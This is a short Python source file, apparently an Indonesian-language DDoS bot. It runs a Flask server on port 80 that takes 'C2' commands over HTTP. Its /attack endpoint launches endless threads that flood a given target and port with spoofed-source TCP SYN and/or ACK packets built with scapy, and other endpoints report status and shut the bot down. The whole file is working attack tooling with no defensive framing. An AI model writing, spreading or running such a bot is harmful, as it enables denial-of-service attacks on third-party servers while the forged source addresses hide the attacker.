from flask import Flask, request
import threading
import random
import time
from scapy.all import IP, TCP, send

app = Flask(__name__)

@app.route('/attack')
def attack():
    target = request.args.get('target')
    port = int(request.args.get('port', 80))
    mode = request.args.get('mode', 'syn')  # syn / ack / mixed

    def syn_flood():
        while True:
            pkt = IP(
                dst=target,
                src=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            ) / TCP(
                sport=random.randint(1024,65535),
                dport=port,
                flags="S"
            )
            send(pkt, verbose=0)
            time.sleep(random.uniform(0.01, 0.05))

    def ack_flood():
        while True:
            pkt = IP(
                dst=target,
                src=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            ) / TCP(
                sport=random.randint(1024,65535),
                dport=port,
                flags="A"
            )
            send(pkt, verbose=0)
            time.sleep(random.uniform(0.01, 0.05))

    # Jalankan thread flood berdasarkan mode
    if mode == "syn":
        for _ in range(3):
            threading.Thread(target=syn_flood, daemon=True).start()
    elif mode == "ack":
        for _ in range(3):
            threading.Thread(target=ack_flood, daemon=True).start()
    elif mode == "mixed":
        for _ in range(2):
            threading.Thread(target=syn_flood, daemon=True).start()
            threading.Thread(target=ack_flood, daemon=True).start()
    else:
        return "[!] Mode tidak valid!", 400

    return f"[✓] Bot serang {target}:{port} mode={mode}", 200

@app.route('/ping')
def ping():
    return "pong", 200

@app.route('/shutdown')
def shutdown():
    shutdown_msg = "[✓] Bot shutdown perintah diterima"
    shutdown_func = request.environ.get('werkzeug.server.shutdown')
    if shutdown_func:
        shutdown_func()
    return shutdown_msg, 200

if __name__ == '__main__':
    print("Bot online di port 80... Siap menerima perintah C2")
    app.run(host='0.0.0.0', port=80)
